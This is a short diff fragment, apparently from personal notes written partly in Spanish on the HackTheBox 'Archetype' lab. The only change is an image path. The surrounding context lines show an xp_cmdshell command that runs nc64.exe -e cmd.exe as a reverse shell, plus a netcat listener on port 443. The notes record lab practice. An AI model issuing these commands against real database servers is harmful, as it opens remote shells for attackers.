@@ -43,4 +43,4 @@ xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 
 
 [[rlwrap -cAr nc -lvnp 443]]  Para estar en escucha
 
-![[Imagenes/Archetype16.png]]
+![[Archetype16.png]]
